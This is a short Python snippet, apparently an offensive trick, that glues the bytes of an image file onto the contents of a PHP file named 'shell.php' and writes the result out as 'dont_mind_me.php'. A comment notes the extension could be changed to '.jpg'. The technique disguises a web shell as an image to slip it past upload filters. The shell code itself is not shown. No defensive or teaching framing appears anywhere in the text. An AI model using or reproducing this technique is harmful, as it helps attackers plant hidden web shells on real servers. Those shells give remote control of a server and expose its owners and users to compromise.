feces = open ('poo.jpg','rb').read()
feces += open ('shell.php','rb').read() 
open ('dont_mind_me.php','wb').write(feces) # it is possible to change the extension to '.jpg'	
